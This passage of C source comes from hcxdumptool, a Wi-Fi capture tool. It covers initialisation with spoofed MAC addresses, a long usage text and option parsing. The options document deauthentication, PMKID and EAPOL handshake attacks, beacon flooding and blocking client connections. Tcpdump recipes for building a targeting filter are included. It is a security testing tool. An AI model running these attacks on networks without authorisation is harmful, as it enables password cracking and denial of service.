		if((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET))
			{
			memset(&drivername, 0, 32);
			if(get_perm_addr(ifa->ifa_name, permaddr, drivername) == true)
				{
				for (p = 0; p < 6; p++) printf("%02x", (permaddr[p]));
				if(checkmonitorinterface(ifa->ifa_name) == false) printf(" %s (%s)\n", ifa->ifa_name, drivername);
				else printf(" %s (%s)  warning: probably a monitor interface!\n", ifa->ifa_name, drivername);
				}
			}
		}
	freeifaddrs(ifaddr);
	}
return;
}
/*===========================================================================*/
static inline bool globalinit()
{
static int c;
static int gpiobasemem = 0;
static const char notavailable[] = { "N/A" };
static const char weakcandidatedefault[] = { "12345678" };

gettimeofday(&tv, NULL);
tvold.tv_sec = tvold.tv_sec;
tvold.tv_usec = tvold.tv_usec;
timestampstart = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec;
timestamp = timestampstart;
srand(time(NULL));
sleepled.tv_sec = 0;
sleepled.tv_nsec = GPIO_LED_DELAY;
sleepled2.tv_sec = 0;
sleepled2.tv_nsec = GPIO_LED_DELAY +GPIO_LED_DELAY;
fd_socket_mccli = 0;
fd_socket_mcsrv = 0;
rpirevision = 0;
if((gpiobutton > 0) || (gpiostatusled > 0))
	{
	if(gpiobutton == gpiostatusled)
		{
		fprintf(stderr, "same value for wpi_button and wpi_statusled is not allowed\n");
		return false;
		}
	gpiobasemem = getrpirev();
	if(gpiobasemem == 0)
		{
		fprintf(stderr, "failed to locate GPIO\n");
		return false;
		}
	if(initgpio(gpiobasemem) == false)
		{
		fprintf(stderr, "failed to init GPIO\n");
		return false;
		}
	if(gpiostatusled > 0)
		{
		INP_GPIO(gpiostatusled);
		OUT_GPIO(gpiostatusled);
		}
	if(gpiobutton > 0)
		{
		INP_GPIO(gpiobutton);
		}
	}
if(gpiostatusled > 0)
	{
	for (c = 0; c < 5; c++)
		{
		GPIO_SET = 1 << gpiostatusled;
		nanosleep(&sleepled, NULL);
		GPIO_CLR = 1 << gpiostatusled;
		nanosleep(&sleepled2, NULL);
		}
	}
if((filteraplist = (maclist_t*)calloc((FILTERLIST_MAX +1), MACLIST_SIZE)) == NULL) return false;
if((filterclientlist = (maclist_t*)calloc((FILTERLIST_MAX +1), MACLIST_SIZE)) == NULL) return false;
if((aplist = (macessidlist_t*)calloc((APLIST_MAX +1), MACESSIDLIST_SIZE)) == NULL) return false;
if((rglist = (macessidlist_t*)calloc((RGLIST_MAX +1), MACESSIDLIST_SIZE)) == NULL) return false;
rgbeaconptr = rglist;
if((rgbeaconlist = (macessidlist_t*)calloc((RGLIST_MAX +1), MACESSIDLIST_SIZE)) == NULL) return false;
rgbeaconlistptr = rgbeaconlist;
if((ownlist = (ownlist_t*)calloc((OWNLIST_MAX +1), OWNLIST_SIZE)) == NULL) return false;
if((pmklist = (pmklist_t*)calloc((PMKLIST_MAX +1), PMKLIST_SIZE)) == NULL) return false;
if((pagidlist = (pagidlist_t*)calloc((PAGIDLIST_MAX +1), PAGIDLIST_SIZE)) == NULL) return false;
if((scanlist = (scanlist_t*)calloc((SCANLIST_MAX +1), SCANLIST_SIZE)) == NULL) return false;
myoui_ap = myvendorap[rand() %((MYVENDORAP_SIZE /sizeof(int)))];
mynic_ap = rand() & 0xffffff;
myoui_ap &= 0xfcffff;
mac_myaphidden[5] = mynic_ap & 0xff;
mac_myaphidden[4] = (mynic_ap >> 8) & 0xff;
mac_myaphidden[3] = (mynic_ap >> 16) & 0xff;
mac_myaphidden[2] = myoui_ap & 0xff;
mac_myaphidden[1] = (myoui_ap >> 8) & 0xff;
mac_myaphidden[0] = (myoui_ap >> 16) & 0xff;
mynic_ap++;
mac_myapopen[5] = mynic_ap & 0xff;
mac_myapopen[4] = (mynic_ap >> 8) & 0xff;
mac_myapopen[3] = (mynic_ap >> 16) & 0xff;
mac_myapopen[2] = myoui_ap & 0xff;
mac_myapopen[1] = (myoui_ap >> 8) & 0xff;
mac_myapopen[0] = (myoui_ap >> 16) & 0xff;
mynic_ap++;
mac_myap[5] = mynic_ap & 0xff;
mac_myap[4] = (mynic_ap >> 8) & 0xff;
mac_myap[3] = (mynic_ap >> 16) & 0xff;
mac_myap[2] = myoui_ap & 0xff;
mac_myap[1] = (myoui_ap >> 8) & 0xff;
mac_myap[0] = (myoui_ap >> 16) & 0xff;
rglist->timestamp = timestampstart;
memcpy(rglist->ap, &mac_myap, 6);
rglist->essidlen = 4;
memcpy(rglist->essid, &myessid, 4);
myoui_client = myvendorclient[rand() %((MYVENDORCLIENT_SIZE /sizeof(int)))];
myoui_client &= 0xffffff;
mac_myclient[5] = rand() & 0xff;
mac_myclient[4] = rand() & 0xff;
mac_myclient[3] = rand() & 0xff;
mac_myclient[2] = myoui_client & 0xff;
mac_myclient[1] = (myoui_client >> 8) &0xff;
mac_myclient[0] = (myoui_client >> 16) &0xff;
memcpy(&mac_myprclient, &mac_myclient, 6);
for(c = 0; c < 32; c++)
	{
	myanonce[c] = rand() %0xff;
	mysnonce[c] = rand() %0xff;
	}
myrc = (rand()%0xfff) +0xf000;
myclientsequence = 1;
myreactivebeaconsequence = 1;
myapsequence = 1;
myapsequence = 1;
mydeauthenticationsequence = 1;
mydisassociationsequence = 1;
myclientsequence = 1;
mytime = 1;
filteraplistentries = 0;
filterclientlistentries = 0;
nmealen = 0;
memset(&nmeatempsentence, 0, NMEA_MAX);
memset(&nmeasentence, 0, NMEA_MAX);
memcpy(&nmeasentence, &notavailable, 3);
weakcandidatelen = 8;
memset(&weakcandidate, 0, 64);
memcpy(&weakcandidate, weakcandidatedefault, 8);

wantstopflag = false;
errorcount = 0;
incomingcount = 0;
outgoingcount = 0;
pmkidcount = 0;
pmkidroguecount = 0;
eapolmp12count = 0;
eapolmp12roguecount = 0;
eapolmp23count = 0;
eapolmp34count = 0;
eapolmp34zeroedcount = 0;
gpscount = 0;
bpf.filter = NULL;
bpf.len = 0;
aktchannel = 0;
signal(SIGINT, programmende);
return true;
}
/*===========================================================================*/
/*===========================================================================*/
__attribute__ ((noreturn))
static inline void version(char *eigenname)
{
printf("%s %s (C) %s ZeroBeat\n", eigenname, VERSION_TAG, VERSION_YEAR);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usage(char *eigenname)
{
printf("%s %s  (C) %s ZeroBeat\n"
	"usage  : %s <options>\n"
	"         press the switch to terminate hcxdumptool\n"
	"         hardware modification is necessary, read more:\n"
	"         https://github.com/ZerBea/hcxdumptool/tree/master/docs\n"
	"example: %s -o output.pcapng -i wlp39s0f3u4u5 -t 5 --enable_status=3\n"
	"         do not run hcxdumptool on logical (NETLINK) interfaces (monx, wlanxmon)\n"
	"         do not use hcxdumptool in combination with 3rd party tools, which take access to the interface (except: tshark, wireshark, tcpdump)\n"
	"\n"
	"short options:\n"
	"-i <interface> : interface (monitor mode will be enabled by hcxdumptool)\n"
	"                 some Realtek interfaces require NETLINK to set monitor mode\n"
	"                 in this case try iw:\n"
	"                 ip link set <interface> down\n"
	"                 iw dev <interface> set type monitor\n"
	"                 ip link set <interface> up\n"
	"                 WARNING:\n"
	"                  hcxdumptool may not work as expected on virtual NETLINK interfaces\n"
	"                  do not report issues related to iw\n"
	"                 It is mandatory that chipset and driver support monitor mode and full packet injection!\n"
	"                 Running a virtual machine, it is mandatory that the hardware is looped through!\n"
	"-o <dump file> : output file in pcapng format\n"
	"                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"-f <frames>    : frames to save\n"
	"                 bitmask:\n"
	"                  0: clear default values\n"
	"                  1: MANAGEMENT frames (default)\n"
	"                  2: EAP and EAPOL frames (default)\n"
	"                  4: IPV4 frames\n"
	"                  8: IPV6 frames\n"
	"                 16: WEP encrypted frames\n"
	"                 32: WPA encrypted frames\n"
	"                 64: vendor defined frames (AWDL)\n"
	"                 to clear default values use -f 0 first, followed by desired frame type (e.g. -f 0 -f 4)\n"
	"-c <digit>     : set scan list (1,2,3, ...)\n"
	"                 default scan list: 1...13\n"
	"                 maximum entries: 127\n"
	"                 allowed channels (depends on the device):\n"
	"                 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14\n"
	"                 32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56, 58, 60, 62, 64, 68, 96\n"
	"                 100, 102, 104, 106, 108, 110, 112, 114, 116, 118, 120, 122, 124, 126, 128\n"
	"                 132, 134, 136, 138, 140, 142, 144, 149, 151, 153, 155, 157, 159\n"
	"                 161, 165, 169, 173\n"
	"-s <digit>     : set predefined scanlist\n"
	"                 0 = 1,6,11,3,5,1,6,11,2,4,1,6,11,7,9,1,6,11,8,10,1,6,11,12,13 (default)\n"
	"                 1 = 1,2,3,4,5,6,7,8,9,10,11,12,13\n"
	"                 2 = 36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165\n"
	"                 3 = 1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165\n"
	"-t <seconds>   : stay time on channel before hopping to the next channel\n"
	"                 default %d seconds\n"
	"-m <interface> : set monitor mode by ioctl() system call and quit\n"
	"-I             : show WLAN interfaces and quit\n"
	"-C             : show available channels and quit\n"
	"                 if no channels are available, interface is probably in use or doesn't support monitor mode\n"
	"-h             : show this help\n"
	"-v             : show version\n"
	"\n"
	"long options:\n"
	"--do_rcascan                       : show radio channel assignment (scan for target access points)\n"
	"                                     this can be used to test that ioctl() calls and packet injection is working\n"
	"                                     if you got no HIT, packet injection is possible not working\n"
	"                                     also it can be used to get information about the target\n"
	"                                     and to determine that the target is in range\n"
	"                                     use this mode to collect data for the filter list\n"
	"                                     run this mode at least for 2 minutes\n"
	"                                     to save all received raw packets use option -o\n"
	"--do_targetscan=<MAC_AP>           : same as do_rcascan - hide all networks, except target\n"
	"                                     format: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66\n"
	"--reason_code=<digit>              : deauthentication reason code\n"
	"                                      recommended codes:\n"
	"                                      1 WLAN_REASON_UNSPECIFIED\n"
	"                                      2 WLAN_REASON_PREV_AUTH_NOT_VALID\n"
	"                                      4 WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY\n"
	"                                      5 WLAN_REASON_DISASSOC_AP_BUSY\n"
	"                                      6 WLAN_REASON_CLASS2_FRAME_FROM_NONAUTH_STA\n"
	"                                      7 WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA (default)\n"
	"                                      9 WLAN_REASON_STA_REQ_ASSOC_WITHOUT_AUTH\n"
	"--disable_client_attacks           : do not attack clients\n"
	"                                     affected: ap-less (EAPOL 2/4 - M2) attack\n"
	"--disable_ap_attacks               : do not attack access points\n"
	"                                     affected: connected clients and client-less (PMKID) attack\n"
	"--stop_ap_attacks=<digit>          : stop attacks against ACCESS POINTs if <n> BEACONs received\n"
	"                                     default: stop after %" PRIu32 " BEACONs\n"
	"--resume_ap_attacks=<digit>        : resume attacks against ACCESS POINTs after <n> BEACONs received\n"
	"                                     default: %" PRIu32 " BEACONs\n"
	"--disable_deauthentication         : do not send deauthentication or disassociation frames\n"
	"                                     affected: conntected clients\n"
	"--silent                           : do not transmit!\n"
	"                                     hcxdumptool is acting like a passive dumper\n"
	"                                     expect possible packet loss\n"
	"--eapoltimeout=<digit>             : set EAPOL TIMEOUT (microseconds)\n"
	"                                     default: %d usec\n"
	"--bpfc=<file>                      : input Berkeley Packet Filter (BPF) code\n"
	"                                     affected: incoming and outgoing traffic\n"
	"                                     steps to create a BPF (it only has to be done once):\n"
	"                                      set hcxdumptool monitormode\n"
	"                                       $ hcxumptool -m <interface>\n"
	"                                      create BPF to protect a MAC\n"
	"                                       $ tcpdump -i <interface> not wlan addr1 11:22:33:44:55:66 and not wlan addr2 11:22:33:44:55:66 -ddd > protect.bpf\n"
	"                                       recommended to protect own devices\n"
	"                                      or create BPF to attack a MAC\n"
	"                                       $ tcpdump -i <interface> wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 -ddd > attack.bpf\n"
	"                                       not recommended, because important pre-authentication frames will be lost due to MAC randomization of the CLIENTs\n"
	"                                      use the BPF code\n"
	"                                       $ hcxumptool -i <interface> --bpfc=attack.bpf ...\n"
	"                                     see man pcap-filter for a list of all filter options\n"
	"--filterlist_ap=<file>             : ACCESS POINT MAC filter list\n"
	"                                     format: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66 # comment\n"
	"                                     maximum entries %d\n"
	"                                     run first --do_rcascan to retrieve information about the target\n"
	"--filterlist_client=<file>         : CLIENT MAC filter list\n"
	"                                     format: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66 # comment\n"
	"                                     maximum entries %d\n"
	"                                     due to MAC randomization of the CLIENT, it does not always work!\n"
	"--filtermode=<digit>               : mode for filter list\n"
	"                                     mandatory in combination with --filterlist_ap and/or --filterlist_client\n"
	"                                     affected: only outgoing traffic\n"
	"                                     notice: hcxdumptool act as passive dumper and it will capture the whole traffic on the channel\n"
	"                                     0: ignore filter list (default)\n"
	"                                     1: use filter list as protection list\n"
	"                                        do not interact with ACCESS POINTs and CLIENTs from this list\n"
	"                                     2: use filter list as target list\n"
	"                                        only interact with ACCESS POINTs and CLIENTs from this list\n"
	"                                        not recommended, because some useful frames could be filtered out\n"
	"--weakcandidate=<password>         : use this pre shared key (8...63 characters) for weak candidate alert\n"
	"                                     will be saved to pcapng to inform hcxpcaptool\n"
	"                                     default: %s\n"
	"--essidlist=<file>                 : transmit beacons from this ESSID list\n"
	"                                     maximum entries: %d ESSIDs\n"
	"--active_beacon                    : transmit beacon from collected ESSIDs and from essidlist once every %d usec\n"
	"                                     affected: ap-less\n"
	"--flood_beacon                     : transmit beacon on every received beacon\n"
	"                                     affected: ap-less\n"
	"--infinity                         : prevent that a CLIENT can establish a connection to an assigned ACCESS POINT\n"
	"                                     affected: ACCESS POINTs and CLIENTs\n"
	"--use_gps_device=<device>          : use GPS device\n"
	"                                     /dev/ttyACM0, /dev/ttyUSB0, ...\n"
	"                                     NMEA 0183 $GPGGA $GPGGA\n"
	"--use_gpsd                         : use GPSD device\n"
	"                                     NMEA 0183 $GPGGA, $GPRMC\n"
	"--nmea=<file>                      : save track to file\n"
	"                                     format: NMEA 0183 $GPGGA, $GPRMC, $GPWPL\n"
	"                                     to convert it to gpx, use GPSBabel:\n"
	"                                     gpsbabel -i nmea -f hcxdumptool.nmea -o gpx -F file.gpx\n"
	"                                     to display the track, open file.gpx with viking\n"
	"--gpio_button=<digit>              : Raspberry Pi GPIO pin number of button (2...27)\n"
	"                                     default = GPIO not in use\n"
	"--gpio_statusled=<digit>           : Raspberry Pi GPIO number of status LED (2...27)\n"
	"                                     default = GPIO not in use\n"
	"--tot=<digit>                      : enable timeout timer in minutes (minimum = 2 minutes)\n"
	"                                   : hcxdumptool will terminate if tot reached (EXIT code = 2)\n"
	"--error_max=<digit>                : terminate hcxdumptool if error maximum reached\n"
	"                                     default: %d errors\n"
	"--reboot                           : once hcxdumptool terminated, reboot system\n"
	"--poweroff                         : once hcxdumptool terminated, power off system\n"
	"--enable_status=<digit>            : enable real-time display (waterfall)\n"
	"                                     only incomming traffic\n"
	"                                     only once at the first occurrence due to MAC randomization of CLIENTs\n"
	"                                     bitmask:\n"
	"                                        0: no status (default)\n"
	"                                        1: EAP and EAPOL\n"
	"                                        2: ASSOCIATION and REASSOCIATION\n"
	"                                        4: AUTHENTICATION\n"
	"                                        8: BEACON and PROBERESPONSE\n"
	"                                       16: ROGUE AP\n"
	"                                       32: GPS (once a minute)\n"
	"                                       64: internal status (once a minute)\n"
	"                                      128: run as server\n"
	"                                      256: run as client\n"
	"                                     characters < 0x20 && > 0x7e are replaced by .\n"
	"                                     example: show everything but don\'t run as server or client (1+2+4+8+16 = 31)\n"
	"                                              show only EAP and EAPOL and ASSOCIATION and REASSOCIATION (1+2 = 3)\n"
	"--server_port=<digit>              : define port for server status output (1...65535)\n"
	"                                   : default IP: %s\n"
	"                                   : default port: %d\n"
	"--client_port=<digit>              : define port for client status read (1...65535)\n"
	"                                   : default IP: %s\n"
	"                                   : default port: %d\n"
	"--check_driver                     : run several tests to determine that driver support all(!) required ioctl() system calls\n"
	"--check_injection                  : run packet injection test to determine that driver support full packet injection\n"
	"                                     default test list: 1...13\n"
	"                                     to test injection on 5GHz channels use option -s 2\n"
	"                                     the driver must support monitor mode and full packet injection\n"
	"                                     otherwise hcxdumptool will not work as expected\n"
	"--help                             : show this help\n"
	"--version                          : show version\n"
	"\n"
	"Run hcxdumptool -i interface --do_rcascan for at least 30 seconds, to get information about the target!\n"
	"Do not edit, merge or convert this pcapng files, because it will remove optional comment fields!\n"
	"It is much better to run gzip to compress the files. Wireshark, tshark and hcxpcapngtool will understand this.\n"
	"If hcxdumptool captured your password from WiFi traffic, you should check all your devices immediately!\n"
	"If you use GPS, make sure GPS device is inserted and has a GPS FIX, before you start hcxdumptool!\n"
	"Important notice:\n"
	"Using filter options, could cause that some useful frames are filtered out!\n"
	"In that case hcxpcapngtool will show a warning that this frames are missing!\n"
	"\n",
	eigenname, VERSION_TAG, VERSION_YEAR, eigenname, eigenname,
	STAYTIME, ATTACKSTOP_MAX, ATTACKRESUME_MAX, EAPOLTIMEOUT, BEACONEXTLIST_MAX, FILTERLIST_MAX, weakcandidate, FILTERLIST_MAX, FDUSECTIMER, ERROR_MAX, MCHOST, MCPORT, MCHOST, MCPORT);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usageerror(char *eigenname)
{
printf("%s %s (C) %s by ZeroBeat\n"
	"usage: %s -h for help\n", eigenname, VERSION_TAG, VERSION_YEAR, eigenname);
exit(EXIT_FAILURE);
}
/*===========================================================================*/
int main(int argc, char *argv[])
{
static int auswahl;
static int index;
static int l, p1, p2;
static long int totvalue;
static int mccliport;
static int mcsrvport;
static int weakcandidatelenuser;
static bool rcascanflag;
static bool injectionflag;
static bool checkdriverflag;
static bool showinterfaceflag;
static bool monitormodeflag;
static bool showchannelsflag;
static char *filteraplistname;
static char *filterclientlistname;
static char *bpfcname;
static char *extaplistname;
static char *nmeaoutname;
static char *weakcandidateuser;
static const char *short_options = "i:o:f:c:s:t:m:IChv";
static const struct option long_options[] =
{
	{"do_rcascan",			no_argument,		NULL,	HCX_DO_RCASCAN},
	{"do_targetscan",		required_argument,	NULL,	HCX_DO_TARGETSCAN},
	{"reason_code",			required_argument,	NULL,	HCX_DEAUTH_REASON_CODE},
	{"disable_deauthentication",	no_argument,		NULL,	HCX_DISABLE_DEAUTHENTICATION},
	{"disable_ap_attacks",		no_argument,		NULL,	HCX_DISABLE_AP_ATTACKS},
	{"stop_ap_attacks",		required_argument,	NULL,	HCX_STOP_AP_ATTACKS},
	{"resume_ap_attacks",		required_argument,	NULL,	HCX_RESUME_AP_ATTACKS},
	{"disable_client_attacks",	no_argument,		NULL,	HCX_DISABLE_CLIENT_ATTACKS},
	{"silent",			no_argument,		NULL,	HCX_SILENT},
	{"filterlist_ap",		required_argument,	NULL,	HCX_FILTERLIST_AP},
	{"filterlist_client",		required_argument,	NULL,	HCX_FILTERLIST_CLIENT},
	{"filtermode	",		required_argument,	NULL,	HCX_FILTERMODE},
	{"bpfc",			required_argument,	NULL,	HCX_BPFC},
	{"weakcandidate	",		required_argument,	NULL,	HCX_WEAKCANDIDATE},
	{"eapoltimeout",		required_argument,	NULL,	HCX_EAPOL_TIMEOUT},
	{"active_beacon",		no_argument,		NULL,	HCX_ACTIVE_BEACON},
	{"flood_beacon",		no_argument,		NULL,	HCX_FLOOD_BEACON},
	{"infinity",			no_argument,		NULL,	HCX_INFINITY},
	{"essidlist",			required_argument,	NULL,	HCX_EXTAP_BEACON},
	{"use_gps_device",		required_argument,	NULL,	HCX_GPS_DEVICE},
	{"use_gpsd",			no_argument,		NULL,	HCX_GPSD},
	{"nmea",			required_argument,	NULL,	HCX_NMEA_NAME},
	{"gpio_button",			required_argument,	NULL,	HCX_GPIO_BUTTON},
	{"gpio_statusled",		required_argument,	NULL,	HCX_GPIO_STATUSLED},
	{"tot",				required_argument,	NULL,	HCX_TOT},
	{"error_max",			required_argument,	NULL,	HCX_ERROR_MAX},
	{"reboot",			no_argument,		NULL,	HCX_REBOOT},
	{"poweroff",			no_argument,		NULL,	HCX_POWER_OFF},
	{"enable_status",		required_argument,	NULL,	HCX_STATUS},
	{"server_port",			required_argument,	NULL,	HCX_SERVER_PORT},
	{"client_port",			required_argument,	NULL,	HCX_CLIENT_PORT},
	{"check_driver",		no_argument,		NULL,	HCX_CHECK_DRIVER},
	{"check_injection",		no_argument,		NULL,	HCX_CHECK_INJECTION},
	{"version",			no_argument,		NULL,	HCX_VERSION},
	{"help",			no_argument,		NULL,	HCX_HELP},
	{NULL,				0,			NULL,	0}
};

auswahl = -1;
index = 0;
optind = 1;
optopt = 0;
gpiobutton = 0;
gpiostatusled = 0;
interfacename = NULL;
pcapngoutname = NULL;
filteraplistname = NULL;
filterclientlistname = NULL;
bpfcname = NULL;
extaplistname = NULL;
gpsname = NULL;
nmeaoutname = NULL;
weakcandidateuser = NULL;
weakcandidatelenuser = 0;
errorcount = 0;
maxerrorcount = ERROR_MAX;
pcapngframesout = PCAPNG_FRAME_DEFAULT;
fh_nmea = NULL;
fd_pcapng = 0;
sl = 0;
cpa = 0;
staytime = STAYTIME;
attackcount = staytime *10;
attackstopcount = ATTACKSTOP_MAX;
attackresumecount = ATTACKRESUME_MAX;
reasoncode = WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA;
myoui_client = 0;
rcascanflag = false;
targetscanflag = false;
beaconactiveflag = false;
beaconfloodflag = false;
checkdriverflag = false;
showinterfaceflag = false;
showchannelsflag = false;
monitormodeflag = false;
totflag = false;
gpsdflag = false;
infinityflag = false;
statusout = 0;
attackstatus = 0;
filtermode = 0;
mccliport = MCPORT;
mcsrvport = MCPORT;
tvtot.tv_sec = 2147483647L;
tvtot.tv_usec = 0;
eapoltimeoutvalue = EAPOLTIMEOUT;

while((auswahl = getopt_long(argc, argv, short_options, long_options, &index)) != -1)
	{
	switch (auswahl)
		{
		case HCX_INTERFACE_NAME:
		interfacename = optarg;
		break;

		case HCX_GPS_DEVICE:
		gpsname = optarg;
		gpsdflag = false;
		break;

		case HCX_GPSD:
		gpsname = NULL;
		gpsdflag = true;
		break;

		case HCX_NMEA_NAME:
		nmeaoutname = optarg;
		break;

		case HCX_CHANNEL:
		if(processuserscanlist(optarg) == false)
			{
			fprintf(stderr, "unknown channel selected\n");
			exit (EXIT_FAILURE);
			}
		break;

		case HCX_SCANLIST:
		sl = strtol(optarg, NULL, 10); 
		if(sl > 3)
			{
			fprintf(stderr, "no predefined scanlist available\n");
			exit (EXIT_FAILURE);
			}
		break;

		case HCX_STAYTIME:
		staytime = strtol(optarg, NULL, 10);
		if(staytime < 2)
			{
			fprintf(stderr, "stay time must be >= 2\n");
			exit (EXIT_FAILURE);
			}
		break;

		case HCX_PCAPNG_NAME:
		pcapngoutname = optarg;
		break;

		case HCX_PACPNG_FRAMES:
		if(strtol(optarg, NULL, 10) == 0) pcapngframesout = strtol(optarg, NULL, 10);
		else pcapngframesout |= strtol(optarg, NULL, 10);
		break;

		case HCX_DO_RCASCAN:
		rcascanflag = true;
		break;

		case HCX_DO_TARGETSCAN:
		rcascanflag = true;
		targetscanflag = true;
		l= strlen(optarg);
		if((l < 12) || (l > 17))
			{
			fprintf(stderr, "error wrong MAC size %s (alowed: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66)\n", optarg);
			exit(EXIT_FAILURE);
			}
		p2 = 0;
		for(p1 = 0; p1 < l; p1++)
			{
			if(isxdigit(optarg[p1]))
				{
				optarg[p2] = optarg[p1];
				p2++;
				}
			}
		if(hex2bin(optarg, lastap, 6) == false)
			{
			fprintf(stderr, "error wrong MAC size %s (alowed: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66)\n", optarg);
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_DEAUTH_REASON_CODE:
		reasoncode = strtol(optarg, NULL, 10);
		break;

		case HCX_DISABLE_CLIENT_ATTACKS:
		attackstatus |= DISABLE_CLIENT_ATTACKS;
		break;

		case HCX_DISABLE_DEAUTHENTICATION:
		attackstatus |= DISABLE_DEAUTHENTICATION;
		break;

		case HCX_DISABLE_AP_ATTACKS:
		attackstatus |= DISABLE_AP_ATTACKS;
		attackstatus |= DISABLE_DEAUTHENTICATION;
		break;

		case HCX_STOP_AP_ATTACKS:
		attackstopcount = strtol(optarg, NULL, 10);
		if(attackstopcount < (STAYTIME *5))
			{
			fprintf(stderr, "must be > than %d\n", staytime *5);
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_RESUME_AP_ATTACKS:
		attackresumecount = strtol(optarg, NULL, 10);
		if(attackresumecount < (STAYTIME *5 *2))
			{
			fprintf(stderr, "must be > than %d\n", staytime *5 *2);
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_SILENT:
		attackstatus = SILENT;
		break;

		case HCX_FILTERLIST_AP:
		filteraplistname = optarg;
		break;

		case HCX_FILTERLIST_CLIENT:
		filterclientlistname = optarg;
		break;

		case HCX_FILTERMODE:
		filtermode = strtol(optarg, NULL, 10);
		if((filtermode < 0) || (filtermode > 2))
			{
			fprintf(stderr, "only 0, 1 and 2 allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_BPFC:
		bpfcname = optarg;
		break;

		case HCX_WEAKCANDIDATE:
		weakcandidateuser = optarg;
		weakcandidatelenuser = strlen(weakcandidateuser);
		if((weakcandidatelenuser < 8) || (weakcandidatelenuser > 63))
			{
			fprintf(stderr, "only length 8...63 characters allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_EAPOL_TIMEOUT:
		eapoltimeoutvalue = strtol(optarg, NULL, 10);
		if(eapoltimeoutvalue <= 0)
			{
			fprintf(stderr, "EAPOL TIMEOUT must be > 0\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_ACTIVE_BEACON:
		beaconactiveflag = true;
		break;

		case HCX_FLOOD_BEACON:
		beaconfloodflag = true;
		break;

		case HCX_INFINITY:
		infinityflag = true;
		break;

		case HCX_EXTAP_BEACON:
		extaplistname = optarg;
		break;

		case HCX_GPIO_BUTTON:
		gpiobutton = strtol(optarg, NULL, 10);
		if((gpiobutton < 2) || (gpiobutton > 27))
			{
			fprintf(stderr, "only 2...27 allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_GPIO_STATUSLED:
		gpiostatusled = strtol(optarg, NULL, 10);
		if((gpiostatusled < 2) || (gpiostatusled > 27))
			{
			fprintf(stderr, "only 2...27 allowed\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_TOT:
		totvalue = strtol(optarg, NULL, 10);
		if(totvalue < 2)
			{
			fprintf(stderr, "tot must be >= 2 (minutes)\n");
			exit(EXIT_FAILURE);
			}
		gettimeofday(&tvtot, NULL);
		tvtot.tv_sec += totvalue *60;
		break;

		case HCX_ERROR_MAX:
		maxerrorcount = strtol(optarg, NULL, 10);
		break;

		case HCX_REBOOT:
		rebootflag = true;
		break;

		case HCX_POWER_OFF:
		poweroffflag = true;
		break;

		case HCX_STATUS:
		statusout |= strtol(optarg, NULL, 10);
		break;

		case HCX_CHECK_DRIVER:
		checkdriverflag = true;
		break;

		case HCX_CHECK_INJECTION:
		injectionflag = true;
		break;

		case HCX_SHOW_INTERFACES:
		showinterfaceflag = true;
		break;

		case HCX_SET_MONITORMODE:
		interfacename = optarg;
		monitormodeflag = true;
		break;

		case HCX_SHOW_CHANNELS:
		showchannelsflag = true;
		break;

		case HCX_SERVER_PORT:
		mcsrvport = strtol(optarg, NULL, 10);
		if((mcsrvport < 1) || (mcsrvport > 65535))
			{
			fprintf(stderr, "port must be 1...65535\n");
			exit(EXIT_FAILURE);
			}
		statusout |= STATUS_SERVER;
		break;

		case HCX_CLIENT_PORT:
		mccliport = strtol(optarg, NULL, 10);
		if((mccliport < 1) || (mccliport > 65535))
			{
			fprintf(stderr, "port must be 1...65535\n");
			exit(EXIT_FAILURE);
			}
		statusout |= STATUS_CLIENT;
		break;

		case HCX_HELP:
		usage(basename(argv[0]));
		break;

		case HCX_VERSION:
		version(basename(argv[0]));
		break;

		case '?':
		usageerror(basename(argv[0]));
		break;
		}
	}

setbuf(stdout, NULL);
if(argc < 2)
	{
	fprintf(stderr, "no option selected\n");
	exit(EXIT_FAILURE);
	}

if((rebootflag == true) && (poweroffflag == true))
	{
	fprintf(stderr, "setting poweroff and reboot together is not allowed\n");
	exit(EXIT_FAILURE);
	}

if(showinterfaceflag == true)
	{
	show_wlaninterfaces();
	return EXIT_SUCCESS;
	}

if(monitormodeflag == true)
	{
	if(getuid() != 0)
		{
		fprintf(stderr, "this program requires root privileges\n");
		globalclose();
		}
	if(interfacename == NULL)
		{
		fprintf(stderr, "no interface specified\n");
		exit(EXIT_FAILURE);
		}
	if(opensocket() == false)
		{
		fprintf(stderr, "failed to init socket\n"
				"try to use iw to set monitor mode\n"
				"try to use ip link to bring interface up\n");
		exit(EXIT_FAILURE);
		}
	printf("setting interface %s to monitor mode\n", interfacename); 
	return EXIT_SUCCESS;
	}

printf("initialization...\n");
if(sl == 1)
	{
	while(channelscanlist1[cpa] != 0)
		{
		channelscanlist[cpa] = channelscanlist1[cpa];
		cpa++;
		}
	channelscanlist[cpa] = 0;
	}
if(sl == 2)
	{
	while(channelscanlist2[cpa] != 0)
		{
		channelscanlist[cpa] = channelscanlist2[cpa];
		cpa++;
		}
	channelscanlist[cpa] = 0;
	}
if(sl == 3)
	{
